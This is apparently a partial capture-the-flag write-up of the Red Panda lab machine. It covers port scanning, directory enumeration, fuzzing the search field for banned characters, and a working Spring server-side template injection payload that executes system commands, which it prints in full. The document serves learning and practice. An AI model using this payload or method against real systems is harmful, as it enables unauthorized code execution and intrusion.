# User
* `nmap -sV -sC 10.129.227.207`
```nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 20:33 EDT
Nmap scan report for 10.129.227.207
Host is up (0.015s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-title: Red Panda Search | Made with Spring Boot
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Wed, 26 Jun 2024 00:33:10 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Wed, 26 Jun 2024 00:33:10 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Wed, 26 Jun 2024 00:33:10 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=6/25%Time=667B61C6%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;cha
SF:rset=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Wed,\x2026\x20Jun\
SF:x202024\x2000:33:10\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20
SF:html>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x
SF:20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"wo
SF:oden_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://cod
SF:epen\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"styl
SF:esheet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20
SF:\x20<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"tex
SF:t/css\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x
SF:20with\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x
SF:20\x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20c
SF:lass='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x
SF:20right'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20lef
SF:t'>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x2
SF:0\x20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x2
SF:0</div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x2020
SF:0\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x2
SF:0Wed,\x2026\x20Jun\x202024\x2000:33:10\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20te
SF:xt/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20
SF:435\r\nDate:\x20Wed,\x2026\x20Jun\x202024\x2000:33:10\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><titl
SF:e>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style
SF:\x20type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x2
SF:0h1,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h
SF:1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:1
SF:4px;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{he
SF:ight:1px;background-color:#525D76;border:none;}</style></head><body><h1
SF:>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></h
SF:tml>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds
```
* navigating to the site brings you to a red panda search engine
![](Red%20Panda-paste.png)
* Browsing to `/robots.txt` reveals that this is a whitelabel page
* I decided to run a gobuster directory scan against the site to see what I could enumerate: 
```bash
gobuster dir -u http://10.129.227.207:8080 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```
* The first can with a `200 OK` response is for `/stats`, so I browsed to it
![](Red%20Panda-paste-1.png)
* The page seems to be for viewer statistics for the authors of the site; one of which is the target user, woodenk
* clicking on woodenk, his stats page has the option to export a table:
![](Red%20Panda-paste-2.png)
* Exporting the table just allows you to see the site contents as an xml file
* I decided to repeat my steps again in burpsuite to see if anything hinky was occurring with the requests and responses
	* saw nothing suspicious with the either
* Looking at the search result for greg prints "Greg is a hacker. Watch out for his injection attacks!"
	* Going to go out on a limb and say this might be vulnerable to an injection attack
* My first thought was to try a sql injection, but that didn't make much sense since no sql database showed on the nmap scan and the table was an xml file
* My second guess was to try SSTI, using the `${7*7}` parameter
	* This resulted in "You searched for: Error occured: banned characters"
* While the result did not return 49 like I had hoped, I was able to narrow down that `$` is a banned character
* I wanted to see what else was a banned character, so I ran burp intruder fuzz against the search parameter:
![](Red%20Panda-paste-3.png)
* I used the wordlist `/usr/share/wfuzz/wordlist/injections` and set the payload processing to be url encoded
	* The following characters received the same error message:
		* `$`
		* `%`
		* `_`
* I still wanted to explore the ssti route, so my next step was to look for the template that was being used.
* Looking further into the whitelabel error page, I found that it is the default error page for a Spring Boot application
* With this information I started a `ctrl f` search for spring on [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---spring) and found the poc payload `*{7*7}`
	* Searching for this in the web app resulted in the output of 49; yippee!
* The next payload I tried was:
```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
* This returned the uids and guids, proving that code execution had been achieved
* I did a ping test to ensure that I could reach my box: `ping -c 4 10.10.14.13`
# Root